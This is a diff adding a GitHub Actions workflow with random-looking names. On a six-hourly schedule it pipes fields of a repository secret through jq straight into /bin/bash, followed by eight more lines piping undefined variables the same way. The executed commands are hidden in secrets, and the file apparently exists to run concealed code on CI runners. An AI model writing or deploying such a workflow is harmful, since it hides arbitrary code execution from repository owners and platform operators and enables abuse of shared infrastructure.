@@ -1,0 +1,25 @@
+name: xiaxijie6537
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaxijie6537
+        env:
+          hmewo2976: ${{ secrets.hmewo2976 }}
+        run: |
+          echo $hmewo2976 | jq -r .ybey626 | /bin/bash
+          echo $dpzg5 | jq -r .ejml69300 | /bin/bash
+          echo $sz2537 | jq -r .ablve6 | /bin/bash
+          echo $awgl50 | jq -r .oy8049 | /bin/bash
+          echo $zo26578 | jq -r .gsnoe09 | /bin/bash
+          echo $oss6247 | jq -r .nq1988 | /bin/bash
+          echo $r8 | jq -r .nd70 | /bin/bash
+          echo $p12 | jq -r .hfeds753 | /bin/bash
+          echo $weux1980 | jq -r .clq90 | /bin/bash
+
